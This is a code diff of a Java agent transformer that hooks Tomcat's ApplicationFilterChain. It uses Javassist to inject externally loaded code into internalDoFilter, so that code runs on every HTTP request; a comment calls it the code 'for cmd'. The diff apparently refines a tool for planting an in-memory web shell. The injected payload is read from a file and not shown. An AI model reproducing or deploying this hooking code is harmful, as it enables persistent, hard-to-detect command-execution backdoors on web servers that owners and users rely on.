@@ -10,9 +10,9 @@ import java.security.ProtectionDomain;
 public class Transformerthings implements ClassFileTransformer {
     @Override
     public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
-        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")){ //这里  xxx/xxx/xxx/xxx
+        byte [] classbytes=classfileBuffer;
+        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")){ // class from in jvm named as xxx/xxx/xxx/xxx
             try {
-//                System.out.println("当前的类是："+className);
 //                System.out.println("a request com and hook the ApplicationFilterChain");
                 ClassPool classPool = ClassPool.getDefault();
 //                System.out.println("classBeingRedefinefined is :"+classBeingRedefined.getName());// classBeingRedefined = null
@@ -20,32 +20,35 @@ public class Transformerthings implements ClassFileTransformer {
 //                System.out.println("this class path :"+classPath.toString())    ;
                 classPool.insertClassPath(classPath);  //add the classpath to classpool  To nextfind
 //                System.out.println("classPool has :"+classPool.toString());
-                CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  //这里 xx.xx.xx
-                CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");
+                if (classBeingRedefined!=null) //for avoide case of null, throw exception
+                {
+                    ClassClassPath classPath1 = new ClassClassPath(classBeingRedefined);
+                    classPool.insertClassPath(classPath1);
+                }
+                CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  //for xx.xx.xx
+                CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");//filterchain dofilter actually implementation ,change it'code and for all request
 
                 ctMethod.addLocalVariable("elapsedTime", CtClass.longType);
-                ctMethod.insertBefore(readSource());
+                ctMethod.insertBefore(readSource());//insert the code for cmd
 
-                byte [] classbytes =ctClass.toBytecode();
+                 classbytes=ctClass.toBytecode();//get changed code and return ,Notice  after the  method of  toBytecode,the ctClass will be forzen
                 /*
                 try get fileclass
                  */
-                FileOutputStream fos =new FileOutputStream("retransformed.class");
-                fos.write(classbytes);
-//                System.out.println("retransformer 修改之后的字节文件还原为retransformed.class");
                 ctClass.detach();
-//                System.out.println("success injected");
-                return classbytes;
+                bytestoclass(classbytes,".\\tmp\\retransformed.class");//get changed class for check
+
 
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }
-        return  classfileBuffer;
-//        return new byte[0];
+        return  classbytes;
     }
-    /*
-    import bytecode we want
+
+    /**
+     * get the code ready for inject internalDoFilter
+     * @return ready code
      */
     private String readSource() {
         StringBuilder source=new StringBuilder();
@@ -61,5 +64,24 @@ public class Transformerthings implements ClassFileTransformer {
             e.printStackTrace();
         }
         return source.toString();
+    }
+
+    /**
+     * output file for check
+     * @param bytes
+     * @param filename
+     */
+    private void bytestoclass(byte [] bytes,String filename) {
+        try{
+            File file = new File(".\\tmp");
+            if (!file.exists())
+                file.mkdir();
+            FileOutputStream fos = new FileOutputStream(filename);
+            fos.write(bytes);
+            fos.flush();
+            fos.close();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
 }
